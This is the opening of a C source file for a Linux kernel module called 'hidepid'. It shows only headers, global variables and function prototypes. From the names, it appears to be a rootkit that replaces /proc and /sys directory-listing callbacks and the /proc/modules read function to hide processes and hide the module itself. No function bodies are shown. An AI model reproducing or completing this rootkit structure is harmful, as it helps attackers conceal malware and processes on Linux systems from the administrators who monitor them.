#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/fs.h>
#include <linux/sysctl.h>

#define MODULE_NAME "hidepid"
#define SYS_MODULE_PATH "/sys/module/"
#define PROC_PATH "/proc/"

MODULE_LICENSE("GPL");

static struct file_operations sys_fop,proc_fop,modules_fop;
const static struct file_operations *original_sys_fop = 0,*original_proc_fop = 0,*original_modules_fops = 0;
static struct proc_dir_entry * module_file = 0;
static struct inode *sys_inode = 0,*proc_inode = 0;
filldir_t original_sys_filldir,original_proc_filldir;

int fake_sys_filldir_t(void *, const char *, int, loff_t, u64, unsigned);
int sys_readdir(struct file *, void *, filldir_t);
int fake_proc_filldir_t(void *, const char *, int, loff_t, u64, unsigned);
int proc_readdir(struct file *, void *, filldir_t);
ssize_t modules_read(struct file *, char __user *, size_t, loff_t *);
void init_hide_sys_module(void);
void init_hide_proc_path(void);
void init_hide_module(void);
